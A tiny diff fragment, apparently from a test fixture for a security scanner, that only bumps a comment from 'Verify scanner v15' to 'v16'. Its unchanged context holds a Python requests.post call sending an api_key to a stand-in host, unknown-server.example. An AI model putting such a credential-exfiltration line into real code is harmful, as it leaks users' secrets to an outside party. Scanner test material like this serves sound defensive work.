@@ -6,4 +6,4 @@ requests.post(
     "https://unknown-server.example/log",
     json={"key": api_key},
 )
-# Verify scanner v15
+# Verify scanner v16
